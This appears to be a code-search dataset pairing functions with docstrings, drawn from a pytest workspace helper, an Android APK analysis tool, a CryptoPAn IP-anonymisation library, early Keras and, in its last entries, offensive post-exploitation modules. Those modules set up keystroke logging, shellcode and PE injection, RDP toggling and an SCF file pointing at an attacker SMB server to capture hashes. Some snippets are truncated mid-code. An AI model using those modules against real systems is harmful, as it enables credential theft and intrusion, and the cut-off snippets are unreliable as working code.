1	class VirtualEnv(Workspace): def __init__(self, env=None, workspace=None, name='.env', python=None, args=None): Workspace.__init__(self, workspace) self.virtualenv = self.workspace / name self.args = args or [] if sys.platform == 'win32': self.python = self.virtualenv / 'Scripts' / 'python.exe' self.easy_install = self.virtualenv / 'Scripts' / 'easy_install.exe' self.coverage = self.virtualenv / 'Scripts' / 'coverage.exe' else: self.python = self.virtualenv / 'bin' / 'python' self.easy_install = self.virtualenv / "bin" / "easy_install" self.coverage = self.virtualenv / 'bin' / 'coverage' if env is None: self.env = dict(os.environ) else: self.env = dict(env) self.env['VIRTUAL_ENV'] = str(self.virtualenv) self.env['PATH'] = str(self.python.dirname()) + ((os.path.pathsep + self.env["PATH"]) if "PATH" in self.env else "") if 'PYTHONPATH' in self.env: del(self.env['PYTHONPATH']) self.virtualenv_cmd = CONFIG.virtualenv_executable if isinstance(self.virtualenv_cmd, str): cmd = [self.virtualenv_cmd] else: cmd = list(self.virtualenv_cmd) cmd.extend(['-p', python or cmdline.get_real_python_executable()]) cmd.extend(self.args) cmd.append(str(self.virtualenv)) self.run(cmd) def run(self, args, **kwargs): if 'env' not in kwargs: kwargs['env'] = self.env return super(VirtualEnv, self).run(args, **kwargs) def run_with_coverage(self, *args, **kwargs): if 'env' not in kwargs: kwargs['env'] = self.env coverage = [str(self.python), str(self.coverage)] return run.run_with_coverage(*args, coverage=coverage, **kwargs) def install_package(self, pkg_name, installer='easy_install', build_egg=None): installed = [p for p in working_set if p.project_name == pkg_name] if not installed or installed[0].location.endswith('.egg'): if sys.platform == 'win32': installer = str(self.virtualenv / 'Scripts' / installer + '.exe') else: installer = str(self.virtualenv / 'bin' / installer) if not self.debug: installer += ' -q' else: pkg = installed[0] d = {'python': self.python, 'easy_install': self.easy_install, 'src_dir': pkg.location, 'name': pkg.project_name, 'version': pkg.version, 'pyversion': sysconfig.get_python_version(), } d['egg_file'] = Path(pkg.location) / 'dist' / ('%(name)s-%(version)s-py%(pyversion)s.egg' % d) if build_egg and not d['egg_file'].isfile(): self.run('cd %(src_dir)s; %(python)s setup.py -q bdist_egg' % d, capture=True) if build_egg or (build_egg is None and d['egg_file'].isfile()): cmd = '%(python)s %(easy_install)s %(egg_file)s' % d else: cmd = 'cd %(src_dir)s; %(python)s setup.py -q develop' % d self.run(cmd, capture=False) def installed_packages(self, package_type=None): if package_type is None: package_type = PackageEntry.ANY elif package_type not in PackageEntry.PACKAGE_TYPES: raise ValueError('invalid package_type parameter (%s)' % str(package_type)) res = {} code = "from pkg_resources import working_set\n"\ "for i in working_set: print(i.project_name + ' ' + i.version + ' ' + i.location)" lines = self.run([self.python, "-c", code], capture=True).split('\n') for line in [i.strip() for i in lines if i.strip()]: name, version, location = line.split() res[name] = PackageEntry(name, version, location) return res	Creates a virtualenv in a temporary workspace, cleans up on exit. Attributes ---------- python : `str` path to the python exe virtualenv : `str` path to the virtualenv base dir env : 'list' environment variables used in creation of virtualenv
1	def run(self, cmd, capture=False, check_rc=True, cd=None, shell=False, **kwargs): if isinstance(cmd, string_types): shell = True else: cmd = [str(i) for i in cmd] if not cd: cd = self.workspace with cmdline.chdir(cd): log.debug("run: {0}".format(cmd)) if capture: p = subprocess.Popen(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, **kwargs) else: p = subprocess.Popen(cmd, shell=shell, **kwargs) (out, _) = p.communicate() if out is not None and not isinstance(out, string_types): out = out.decode('utf-8') if self.debug and capture: log.debug("Stdout/stderr:") log.debug(out) if check_rc and p.returncode != 0: err = subprocess.CalledProcessError(p.returncode, cmd) err.output = out if capture and not self.debug: log.error("Stdout/stderr:") log.error(out) raise err return out	Run a command relative to a given directory, defaulting to the workspace root Parameters ---------- cmd : `str` or `list` Command string or list. Commands given as a string will be run in a subshell. capture : `bool` Capture and return output check_rc : `bool` Assert return code is zero cd : `str` Path to chdir to, defaults to workspace root
1	def get_base_tempdir(): return os.getenv('WORKSPACE')	Returns an appropriate dir to pass into tempfile.mkdtemp(dir=xxx) or similar.
1	class Workspace(object): debug = False delete = True def __init__(self, workspace=None, delete=None): self.delete = delete log.debug("") log.debug("=======================================================") if workspace is None: self.workspace = Path(tempfile.mkdtemp(dir=self.get_base_tempdir())) log.debug("pytest_shutil created workspace %s" % self.workspace) else: self.workspace = Path(workspace) log.debug("pytest_shutil using workspace %s" % self.workspace) if 'DEBUG' in os.environ: self.debug = True if self.delete is not False: log.debug("This workspace will delete itself on teardown") log.debug("=======================================================") log.debug("") def __enter__(self): return self def __exit__(self, errtype, value, traceback): if self.delete is None: self.delete = (errtype is None) self.teardown() def __del__(self): self.teardown() def get_base_tempdir(): return os.getenv('WORKSPACE') def run(self, cmd, capture=False, check_rc=True, cd=None, shell=False, **kwargs): if isinstance(cmd, string_types): shell = True else: cmd = [str(i) for i in cmd] if not cd: cd = self.workspace with cmdline.chdir(cd): log.debug("run: {0}".format(cmd)) if capture: p = subprocess.Popen(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, **kwargs) else: p = subprocess.Popen(cmd, shell=shell, **kwargs) (out, _) = p.communicate() if out is not None and not isinstance(out, string_types): out = out.decode('utf-8') if self.debug and capture: log.debug("Stdout/stderr:") log.debug(out) if check_rc and p.returncode != 0: err = subprocess.CalledProcessError(p.returncode, cmd) err.output = out if capture and not self.debug: log.error("Stdout/stderr:") log.error(out) raise err return out def teardown(self): if self.delete is not None and not self.delete: return if self.workspace.isdir(): log.debug("") log.debug("=======================================================") log.debug("pytest_shutil deleting workspace %s" % self.workspace) log.debug("=======================================================") log.debug("") shutil.rmtree(self.workspace, ignore_errors=True)	Creates a temp workspace, cleans up on teardown. Can also be used as a context manager. Has a 'run' method to execute commands relative to this directory.
1	def run_find_mapping(self): enums = APIMappings() x = analysis.uVMAnalysis(self.apks.get_vm()) for permission in self.apk.get_permissions(): for a, b in enums.mappings.items(): for c, d in b.items(): if "permission" in c: if permission == d: print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Found permission mapping : ") + permission)) if b.get("class"): for e, f in b.get("class").items(): print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Searching for : ") + e)) if f.get("method"): self.run_search_method(self.apks, x, e, f.get("method")) elif f.get("methods"): for method in f.get("methods"): self.run_search_method(self.apks, x, e, method) elif b.get("classes"): for g, h in b.get("classes").items(): print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Searching for : ") + g)) if h.get("method"): self.run_search_method(self.apks, x, g, h.get("method")) elif h.get("methods"): for method in h.get("methods"): self.run_search_method(self.apks, x, g, method)	Map permissions to API calls with the analyzed bytecode
1	def do_webview(): web_view = """ Dalvik.perform(function () { var WebView = Dalvik.use("android.webkit.WebView"); var WebViewClient = Dalvik.use("android.webkit.WebViewClient"); WebView.loadUrl.overload("java.lang.String").implementation = function (s) { send("loadUrl()"); this.loadUrl.overload("java.lang.String").call(this, s); }; WebView.addJavascriptInterface.implementation = function (o, s) { send("addJavascriptInterface()"); this.addJavascriptInterface(o, s); }; WebViewClient.shouldOverrideUrlLoading.implement = function (o, s) { send("shouldOverrideUrlLoading()"); send(s.toString()); this.shouldOverrideUrlLoading(o, s); }; }); return web_view	Instrument calls made to WebViews - loadUrl(), addJavascriptInterface()
1	def do_activities(): activities = """ Dalvik.perform(function () { var Activity = Dalvik.use("android.app.Activity"); var Intent = Dalvik.use("android.content.Intent"); Activity.onNewIntent.implementation = function (i) { var intent = Dalvik.cast(i, Intent); action = intent.getAction(); component = intent.getComponent(); extras = intent.getExtras(); send("onNewIntent()"); send(component.toString()); send(action.toString()); if(extras) { send("Found extras!"); } this.onNewIntent(i); }; Activity.onCreate.implementation = function (b) { currentActivity = this.getComponentName(); send("onCreate()"); send(currentActivity.toString()); this.onCreate(b); }; }); return activities	Instrument calls made to activities - onCreate(), onNewIntent()
1	def run_loader(self): print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Loading : ") + "{0}".format(self.apk))) return APK(self.apk), AndroguardS(self.apk)	Load the target APK and return the loaded instance, which will be stored as a global
1	def timeout(self, process): if process.poll() is None: print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Gathering logs ..."))) out = process.communicate() self.http_handler(out)	Callback to handle process timeouts
1	def run_logcat(self): while True: result = raw_input(t.green("[{0}] ".format(datetime.now()) + t.yellow("Would you like to run Logcat? { Y || N } : "))) if result == "N": break elif result == "Y": keyword = raw_input(t.green("[{0}] ".format(datetime.now()) + t.yellow("Enter keyword search : "))) try: p = Popen("adb logcat -d | grep {0}".format(keyword), stdout=PIPE, stderr=PIPE, shell=True) thread = Timer(3.0, self.timeout, [p]) thread.start() thread.join() except CalledProcessError as e: print(t.red("[{0}] ".format(datetime.now()) + e.returncode)) Logger.run_logger(e.message) except IOError as e: print(t.red("[{0}] ".format(datetime.now()) + e.message)) Logger.run_logger(e.message)	Run Logcat with a keyword search that dumps output
1	def http_handler(output): try: with open("{0}/framework/config".format(os.getcwd()), "r") as config: ip = config.readline() config.close() data = {"data": output} # TODO - 07/26/2015 r = requests.post("http://{0}:5000/services/logcat/update".format(ip.strip("\n")), data=data) if r.text == "Success": print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Success!"))) else: print(t.green("[{0}] ".format(datetime.now()) + t.red("Error! ") + "Check flask.log")) except IOError as e: print(t.red("[{0}] ".format(datetime.now()) + e)) Logger.run_logger(e) except requests.ConnectionError as e: print(t.red("[{0}] ".format(datetime.now()) + e.response)) Logger.run_logger(e.response) return	Handler for submitting logs to the logcat web service
1	def run(self): x = analysis.uVMAnalysis(self.apks.get_vm()) vm = self.apks.get_vm() if x: print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Performing surgery ..."))) for a, b in self.enum.values.items(): for c in b: paths = x.get_tainted_packages().search_methods("{0}".format(a), "{0}".format(c), ".") if paths: for p in paths: for method in self.apks.get_methods(): if method.get_name() == p.get_src(vm.get_class_manager())[1]: if method.get_class_name() == p.get_src(vm.get_class_manager())[0]: print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Found: ") + "{0}".format(c))) print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Class: ") + "{0}".format(method.get_class_name()))) print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Method: ") + "{0}".format(method.get_name()))) print(method.show())	Search for logging API usage within target class and methods
1	def run_list_permissions(self): permissions = self.apk.get_permissions() for permission in permissions: print(t.green("[{0}] ".format(datetime.now())) + t.yellow("Permission: ") + permission)	List the permissions within the target APK
1	def run_map_permissions(self): mappings = APIPermissionMappings(self.apk, self.apks) mappings.run_find_mapping()	Map permissions within the target APK to API calls
1	def do_loader(args): try: from framework.brains.apk.loader import Loader loader = Loader(args) global apk, apks apk, apks = loader.run_loader() except ImportError as e: print(t.red("[{0}] ".format(datetime.now()) + "Unable to import Loader")) Logger.run_logger(e.message)	Description: Load target APK for analysis wth androguard -- Requirements: Target APK Usage: loader
1	def do_decompile(args): try: from framework.brains.apk.decompile import Decompile decompile = Decompile(args.split()[0], args.split()[1]) decompile.run_decompile() except ImportError as e: print(t.red("[{0}] ".format(datetime.now()) + "Unable to import Decompile")) Logger.run_logger(e.message)	Description: Decompile target APK with apktool.jar Requirements: Target APK Usage: decompile?&&
1	public class ExprUtil { private static final Expr RULE = toSymbol("Rule"); private static final Expr TRUE = toSymbol("True"); private static final Expr FALSE = toSymbol("False"); public static Expr toSymbol(String symbol) { return new Expr(Expr.SYMBOL, symbol); } public static Expr toExpr(Object obj) { Expr expr = null; if (obj instanceof Buffer) { } else if (obj instanceof Byte) { expr = byteToExpr((Byte) obj); } else if (obj instanceof Boolean) { expr = booleanToExpr((Boolean) obj); } else if (obj instanceof Integer) { expr = new Expr((Integer) obj); } else if (obj instanceof Long) { expr = new Expr((Long) obj); } else if (obj instanceof Float) { expr = new Expr((Float) obj); } else if (obj instanceof Double) { expr = new Expr((Double) obj); } else if (obj instanceof String) { expr = new Expr((String) obj); } else if (obj instanceof ArrayList) { expr = listToExpr((List	Utility class for serializing a subset of Java types to Expr objects.
1	class AddressValueError(ValueError): pass class CryptoPAn(object):	Exception class raised when the IP address parser (the netaddr module in Python < 3.3 or ipaddress module) failed.
1	def __init__(self, key): assert(len(key) == 32) if sys.version_info.major < 3: assert type(key) is str else: assert type(key) is bytes self._cipher = AES.new(key[:16], AES.MODE_ECB) self._padding = array('B') if sys.version_info.major == 2: self._padding.fromstring(self._cipher.encrypt(key[16:])) else: self._padding.frombytes(self._cipher.encrypt(key[16:])) self._padding_int = self._to_int(self._padding) self._gen_masks()	Initialize a CryptoPAn() instance. Args: key: a 32 bytes object used for AES key and padding when performing a block cipher operation. The first 16 bytes are used for the AES key, and the latter for padding. Changelog: A bytes object (not string) is required for python3.
1	def anonymize(self, addr): aaddr = None if sys.version_info < (3, 3): try: ip = netaddr.IPNetwork(addr) except netaddr.AddrFormatError: raise AddressValueError aaddr = self.anonymize_bin(ip.value, ip.version) else: try: ip = ipaddress.ip_address(addr) except (ValueError, ipaddress.AddressValueError) as e: raise AddressValueError aaddr = self.anonymize_bin(int(ip), ip.version) if ip.version == 4: return '%d.%d.%d.%d' % (aaddr>>24, (aaddr>>16) & 0xff, (aaddr>>8) & 0xff, aaddr & 0xff) else: return '%x:%x:%x:%x:%x:%x:%x:%x' % (aaddr>>112, (aaddr>>96) & 0xffff, (aaddr>>80) & 0xffff, (aaddr>>64) & 0xffff, (aaddr>>48) & 0xffff, (aaddr>>32) & 0xffff, (aaddr>>16) & 0xffff, aaddr & 0xffff)	Anonymize an IP address represented as a text string. Args: addr: an IP address string. Returns: An anoymized IP address string.
1	def anonymize_bin(self, addr, version): assert(version == 4 or version == 6) if version == 4: pos_max = 32 ext_addr = addr << 96 else: pos_max = 128 ext_addr = addr flip_array = [] for pos in range(pos_max): prefix = ext_addr >> (128 - pos) << (128 - pos) padded_addr = prefix | (self._padding_int & self._masks[pos]) if sys.version_info.major == 2: f = self._cipher.encrypt(self._to_array(padded_addr, 16).tostring()) else: f = self._cipher.encrypt(self._to_array(padded_addr, 16).tobytes()) flip_array.append(bytearray(f)[0] >> 7) result = reduce(lambda x, y: (x << 1) | y, flip_array) return addr ^ result	Anonymize an IP address represented as an integer value. Args: addr: an IP address value. version: the version of the address (either 4 or 6) Returns: An anoymized IP address value.
1	def _gen_masks(self): mask128 = reduce (lambda x, y: (x << 1) | y, [1] * 128) self._masks = [0] * 128 for l in range(128): self._masks[l] = mask128 >> l	Generates an array of bit masks to calculate n-bits padding data.
1	def _to_array(self, int_value, int_value_len): byte_array = array('B') for i in range(int_value_len): byte_array.insert(0, (int_value >> (i * 8)) & 0xff) return byte_array	Convert an int value to a byte array.
1	def _to_int(self, byte_array): return reduce(lambda x, y: (x << 8) | y, byte_array)	Convert a byte array to an int value.
1	class IPAddressCrypt(object): def __init__(self, key, no_anonymize=_no_anonymize, preserve_prefix=None, debug=False): self.cp = CryptoPAn(key) self._no_anonymize = no_anonymize self.debug = debug if preserve_prefix is None: self._preserve_prefix = [] else: self._preserve_prefix = preserve_prefix def get_preserve_prefix_net(self, ip): preserve = [net for net in self._preserve_prefix if net.version == ip.version] for net in preserve: if ip in net: return net return None def is_preserve_prefix(self, ip): return self.get_preserve_prefix_net(ip) is not None def anonymize(self, ip): ip = ip_address(ip) if self._no_anonymize(ip, self.debug): return ip elif self.is_preserve_prefix(ip): net = self.get_preserve_prefix_net(ip) ip_anonymized = ip_address(self.cp.anonymize(ip)) return _overwrite_prefix(ip_anonymized, net) else: ip_anonymized = ip_address(self.cp.anonymize(ip)) if self._no_anonymize(ip_anonymized, debug=False): print("INFO: anonymized ip {} mapped to a special ip which should " "not be anonymized ({}). Please re-run with a different key" .format(ip, ip_anonymized), file=sys.stderr) sys.exit(1) if self.is_preserve_prefix(ip_anonymized): print("INFO: anonymized ip {} mapped to special " "address range ({} in {}). " "Please re-run with a different key" .format(ip, ip_anonymized, self.get_preserve_prefix_net(ip_anonymized)), file=sys.stderr) sys.exit(1) return ip_anonymized	Anonymize IP addresses keepting prefix consitency. Mapping special purpose ranges to special purpose ranges
1	def prefix_preserving_static(self, raws, prefix_offset=0): self.assertTrue(ip_in_subnet(raws[0], raws[1], 12+prefix_offset)) self.assertTrue(not ip_in_subnet(raws[0], raws[2], 8+prefix_offset)) self.assertTrue(ip_in_subnet(raws[0], raws[5], 32+prefix_offset)) self.assertTrue(ip_in_subnet(raws[29], raws[30], 9+prefix_offset)) self.assertTrue(ip_in_subnet(raws[63], raws[77], 12+prefix_offset)) self.assertTrue(ip_in_subnet(raws[77], raws[78], 17+prefix_offset)) self.assertTrue(ip_in_subnet(raws[87], raws[88], 3+prefix_offset)) self.assertTrue(ip_in_subnet(raws[86], raws[87], 3+prefix_offset))	For the testvector, checks if some ip addresses are subset of each other. Manually hardcoded. Add prefix_offset to the prefix
1	def prefix_preserving_dynamic(self, raws, prefix_offset=0): for (ip_index, network_index, prefix_len, result) in self.pp_dynamic_testvector: self.assertEqual(ip_in_subnet(raws[ip_index], raws[network_index], prefix_len+prefix_offset), result)	For the testvector, checks if some ip addresses are subset of each other. Check dynamically initialized.
1	def prefix_preserving(self, raws, prefix_offset=0): self.prefix_preserving_static(raws, prefix_offset) self.prefix_preserving_dynamic(raws, prefix_offset)	About prefix_offset: Usually, it is zero If we map an ipv4 address into the least significant bits of an ipv6 address, we can set the prefix_offset to 96, which compensates for the 96 zeros we added by extending an ipv4 address to 128 bit.
1	def test_ipv6_prefix_preserving_prepend_reference(self): def to_ip6(ip): ip = int(mk_ip_address(ip, version=4)) ip = mk_ip_address(ip << 96, version=6) return format_ip_verbose(ip) cp = CryptoPAn(bytes(self.key)) raws = [] anons = [] for (raw, _) in self.testvector: raw_ip6 = to_ip6(raw) self.assertEqual(len(raw_ip6), 39) cp_ip6 = cp.anonymize(raw_ip6) raws.append(raw_ip6) anons.append(cp_ip6) self.prefix_preserving(raws) self.prefix_preserving(anons) def from_ip6(ip): ip = mk_ip_address(ip, version=6) ip = format_ip_verbose(ip)[:9] ip = "%s::0" % ip ip = int(mk_ip_address(ip, version=6)) ip = ip >> 96 ip = mk_ip_address(ip, version=4) return "%s" % ip for i in range(len(self.testvector)): anonymized = anons[i] (sanity_check_raw, expected) = self.testvector[i] self.assertEqual(sanity_check_raw, from_ip6(raws[i])) self.assertEqual(from_ip6(anonymized), expected)	The test vector of the reference implementation is hacky-transformed to IPv6 addresses. The most significant bits of the IPv6 address are simply set to the 32 bit of the IPv4 address. We check that after anonymizing, the thing is still prefix-preserving. Converting back to IPv4 (extracting the 32 most significant bits), the same result as in IPv4 reference anonymization is computed.
1	def test_ipv6_prefix_preserving_least_significant_random(self): prefix = (random.randint(0, (2**96) - 1)) << 32 def to_ip6(ip): ip = int(mk_ip_address(ip, version=4)) ip = mk_ip_address(prefix + ip, version=6) return format_ip_verbose(ip) cp = CryptoPAn(bytes(self.key)) raws = [] anons = [] for (raw, _) in self.testvector: raw_ip6 = to_ip6(raw) self.assertEqual(len(raw_ip6), 39) cp_ip6 = cp.anonymize(raw_ip6) raws.append(raw_ip6) anons.append(cp_ip6) self.prefix_preserving(raws, prefix_offset=96) self.prefix_preserving(anons, prefix_offset=96)	Map the testvector ipv4 address into the lower 32 bit of an ipv6 address. Add a random but fixed prefix for all addresses. Check that anonymization is still prefix preserving.
1	def test_ipv6_prefix_preserving(self): cp = CryptoPAn(bytes(self.key)) print("This test may take some time to complete.") for i in range(96): prefix = (random.randint(0, (2**(96-i)) - 1)) << (32+i) raws = [] anons = [] for (raw, _) in self.testvector: raw_ip6 = mk_ip_address(prefix + (int(mk_ip_address(raw, version=4))<	the same as test_ipv6_prefix_preserving_least_significant_random but shift the ipv4 addresses to higher positions. For each ip, fill the lower bits with random. May take some time to complete.
1	class Activation(Layer): def __init__(self, activation, target=0, beta=0.1): super(Activation,self).__init__() self.activation = activations.get(activation) self.target = target self.beta = beta def get_output(self, train): X = self.get_input(train) return self.activation(X) def get_config(self): return {"name":self.__class__.__name__, "activation":self.activation.__name__, "target":self.target, "beta":self.beta} class Reshape(Layer):	Apply an activation function to an output.
2	class Adadelta(Optimizer): def __init__(self, lr=1.0, rho=0.95, epsilon=1e-6, *args, **kwargs): self.__dict__.update(kwargs) self.__dict__.update(locals()) def get_updates(self, params, regularizers, constraints, cost): grads = self.get_gradients(cost, params, regularizers) accumulators = [shared_zeros(p.get_value().shape) for p in params] delta_accumulators = [shared_zeros(p.get_value().shape) for p in params] updates = [] for p, g, a, d_a, c in zip(params, grads, accumulators, delta_accumulators, constraints): new_a = self.rho * a + (1 - self.rho) * g ** 2 updates.append((a, new_a)) update = g * T.sqrt(d_a + self.epsilon) new_p = p - self.lr * update updates.append((p, c(new_p))) new_d_a = self.rho * d_a + (1 - self.rho) * update ** 2 updates.append((d_a, new_d_a)) return updates class Adam(Optimizer):	Reference: http://arxiv.org/abs/1212.5701
1	class Adam(Optimizer): def __init__(self, lr=0.001, beta_1=0.9, beta_2=0.999, epsilon=1e-8, kappa=1-1e-8, *args, **kwargs): self.__dict__.update(kwargs) self.__dict__.update(locals()) self.iterations = shared_scalar(0) def get_updates(self, params, regularizers, constraints, cost): grads = self.get_gradients(cost, params, regularizers) updates = [(self.iterations, self.iterations+1.)] i = self.iterations beta_1_t = self.beta_1 * (self.kappa**i) beta_2_t = self.beta_2 * (self.kappa**i) for p, g, c in zip(params, grads, constraints): m = theano.shared(p.get_value() * 0.) v = theano.shared(p.get_value() * 0.) m_t = (beta_1_t * m) + (1 - beta_1_t) * g v_t = (beta_2_t * v) + (1 - beta_2_t) * (g**2) m_b_t = m_t / (1 - beta_1_t) v_b_t = v_t / (1 - beta_2_t) p_t = p - self.lr * m_b_t / (T.sqrt(v_b_t) + self.epsilon) updates.append((m, m_t)) updates.append((v, v_t)) updates.append((p, c(p_t))) return updates # aliases sgd = SGD	Reference: http://arxiv.org/abs/1412.6980 Default parameters follow those provided in the original paper lambda is renamed kappa.
1	class Embedding(Layer): def __init__(self, input_dim, output_dim, init='uniform', weights=None, W_regularizer=None, W_constraint=None): super(Embedding,self).__init__() self.init = initializations.get(init) self.input_dim = input_dim self.output_dim = output_dim self.input = T.imatrix() self.W = self.init((self.input_dim, self.output_dim)) self.params = [self.W] self.constraints = [W_constraint] self.regularizers = [W_regularizer] if weights is not None: self.set_weights(weights) def get_output(self, train=False): X = self.get_input(train) out = self.W[X] return out def get_config(self): return {"name":self.__class__.__name__, "input_dim":self.input_dim, "output_dim":self.output_dim, "init":self.init.__name__} class WordContextProduct(Layer):	Turn positive integers (indexes) into denses vectors of fixed size. eg. [[4], [20]] -> [[0.25, 0.1], [0.6, -0.2]] @input_dim: size of vocabulary (highest input integer + 1) @out_dim: size of dense representation
1	class Flatten(Layer): def __init__(self): super(Flatten,self).__init__() def get_output(self, train): X = self.get_input(train) size = theano.tensor.prod(X.shape) // X.shape[0] nshape = (X.shape[0], size) return theano.tensor.reshape(X, nshape) class RepeatVector(Layer):	Reshape input to flat shape. First dimension is assumed to be nb_samples.
1	def categorical_crossentropy(y_true, y_pred): y_pred = T.clip(y_pred, epsilon, 1.0 - epsilon) y_pred /= y_pred.sum(axis=1, keepdims=True) return T.nnet.categorical_crossentropy(y_pred, y_true).mean()	Expects a binary class matrix instead of a vector of scalar classes
1	def to_categorical(y): nb_classes = np.max(y)+1 Y = np.zeros((len(y), nb_classes)) for i in range(len(y)): Y[i, y[i]] = 1. return Y	Convert class vector (integers from 0 to nb_classes) to binary class matrix, for use with categorical_crossentropy
1	def pad_sequences(sequences, maxlen=None, dtype='int32'): lengths = [len(s) for s in sequences] nb_samples = len(sequences) if maxlen is None: maxlen = np.max(lengths) x = np.zeros((nb_samples, maxlen)).astype(dtype) for idx, s in enumerate(sequences): x[idx, :lengths[idx]] = s[:maxlen] return x	Pad each sequence to the same length: the length of the longuest sequence. If maxlen is provided, any sequence longer than maxlen is truncated to maxlen.
1	def text_to_word_sequence(text, filters=base_filter(), lower=True, split=" "): if lower: text = text.lower() text = text.translate(maketrans(filters, split*len(filters))) seq = text.split(split) return [_f for _f in seq if _f]	prune: sequence of characters to filter out
1	def make_sampling_table(size, sampling_factor=1e-5): gamma = 0.577 rank = np.array(list(range(size))) rank[0] = 1 inv_fq = rank * (np.log(rank) + gamma) + 0.5 - 1./(12.*rank) f = sampling_factor * inv_fq return np.minimum(1., f / np.sqrt(f))	This generates an array where the ith element is the probability that a word of rank i would be sampled, according to the sampling distribution used in word2vec. The word2vec formula is: p(word) = min(1, sqrt(word.frequency/sampling_factor) / (word.frequency/sampling_factor)) We assume that the word frequencies follow Zipf's law (s=1) to derive a numerical approximation of frequency(rank): frequency(rank) ~ 1/(rank * (log(rank) + gamma) + 1/2 - 1/(12*rank)) where gamma is the Euler-Mascheroni constant.
1	categorical=False, sampling_table=None): couples = [] labels = [] for i, wi in enumerate(sequence): if not wi: continue if sampling_table is not None: if sampling_table[wi] < random.random(): continue window_start = max(0, i-window_size) window_end = min(len(sequence), i+window_size+1) for j in range(window_start, window_end): if j != i: wj = sequence[j] if not wj: continue couples.append([wi, wj]) if categorical: labels.append([0,1]) else: labels.append(1) if negative_samples > 0: nb_negative_samples = int(len(labels) * negative_samples) words = [c[0] for c in couples] random.shuffle(words) couples += [[words[i%len(words)], random.randint(1, vocabulary_size-1)] for i in range(nb_negative_samples)] if categorical: labels += [[1,0]]*nb_negative_samples else: labels += [0]*nb_negative_samples if shuffle: seed = random.randint(0,10e6) random.seed(seed) random.shuffle(couples) random.seed(seed) random.shuffle(labels) return couples, labels	Take a sequence (list of indexes of words), returns couples of [word_index, other_word index] and labels (1s or 0s), where label = 1 if 'other_word' belongs to the context of 'word', and label=0 if 'other_word' is ramdomly sampled @param vocabulary_size: int. maximum possible word index + 1 @param window_size: int. actually half-window. The window of a word wi will be [i-window_size, i+window_size+1] @param negative_samples: float >= 0. 0 for no negative (=random) samples. 1 for same number as positive samples. etc. @param categorical: bool. if False, labels will be integers (eg. [0, 1, 1 .. ]), if True labels will be categorical eg. [[1,0],[0,1],[0,1] .. ] Note: by convention, index 0 in the vocabulary is a non-word and will be skipped.
1	def options(self, context, module_options): if 'TIMEOUT' not in module_options: context.log.error('TIMEOUT option is required!') exit(1) self.stream = False self.poll = 20 self.timeout = int(module_options['TIMEOUT']) if 'STREAM' in module_options: self.stream = bool(module_options['STREAM']) if 'POLL' in module_options: self.poll = int(module_options['POLL']) context.log.info('This module will not exit until CTRL-C is pressed') context.log.info('Keystrokes will be stored in ~/.cme/logs\n') self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1') self.ps_script2 = obfs_ps_script('powersploit/Exfiltration/Get-Keystrokes.ps1') if self.stream: self.share_name = gen_random_string(5).upper() self.smb_server = CMESMBServer(context.log, self.share_name, context.log_folder_path) self.smb_server.start() else: self.file_name = gen_random_string(5)	TIMEOUT Specifies the interval in minutes to capture keystrokes. STREAM Specifies whether to stream the keys over the network (default: False) POLL Specifies the interval in seconds to poll the log file (default: 20)
1	def options(self, context, module_options): if not 'PATH' in module_options: context.log.error('PATH option is required!') exit(1) self.payload_path = os.path.expanduser(module_options['PATH']) if not os.path.exists(self.payload_path): context.log.error('Invalid path to EXE/DLL!') exit(1) self.procid = None self.exeargs = None if 'PROCID' in module_options: self.procid = module_options['PROCID'] if 'EXEARGS' in module_options: self.exeargs = module_options['EXEARGS'] self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1')	PATH Path to dll/exe to inject PROCID Process ID to inject into (default: current powershell process) EXEARGS Arguments to pass to the executable being reflectively loaded (default: None)
1	def options(self, context, module_options): if not 'ACTION' in module_options: context.log.error('ACTION option not specified!') exit(1) if module_options['ACTION'].lower() not in ['enable', 'disable']: context.log.error('Invalid value for ACTION option!') exit(1) self.action = module_options['ACTION'].lower()	ACTION Enable/Disable RDP (choices: enable, disable)
1	def options(self, context, module_options): self.exec_methods = ['smbexec', 'atexec'] self.inject = True if 'INJECT' in module_options: self.inject = bool(module_options['INJECT']) if self.inject: self.exec_methods = None self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1') self.ps_script2 = obfs_ps_script('powersploit/Recon/PowerView.ps1')	INJECT If set to true, this allows PowerView to work over'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: True)
1	def options(self, context, module_options): self.cleanup = False if 'CLEANUP' in module_options: self.cleanup = bool(module_options['CLEANUP']) if 'NAME' not in module_options: context.log.error('NAME option is required!') exit(1) if not self.cleanup and 'SERVER' not in module_options: context.log.error('SERVER option is required!') exit(1) self.scf_name = module_options['NAME'] self.scf_path = '/tmp/{}.scf'.format(self.scf_name) self.file_path = ntpath.join('\\', '{}.scf'.format(self.scf_name)) if not self.cleanup: self.server = module_options['SERVER'] scuf = open(self.scf_path, 'a'); scuf.write("[Shell]" + '\n'); scuf.write("Command=2" + '\n'); scuf.write("IconFile=" + '\\\\{}\\share\\icon.ico'.format(self.server) + '\n'); scuf.close();	SERVER IP of the SMB server NAME SCF file name CLEANUP Cleanup (choices: True or False)
1	def options(self, context, module_options): if not 'PATH' in module_options: context.log.error('PATH option is required!') exit(1) self.shellcode_path = os.path.expanduser(module_options['PATH']) if not os.path.exists(self.shellcode_path): context.log.error('Invalid path to shellcode!') exit(1) self.procid = None if 'PROCID' in module_options.keys(): self.procid = module_options['PROCID'] self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-Shellcode.ps1')	PATH Path to the file containing raw shellcode to inject PROCID Process ID to inject into (default: current powershell process)
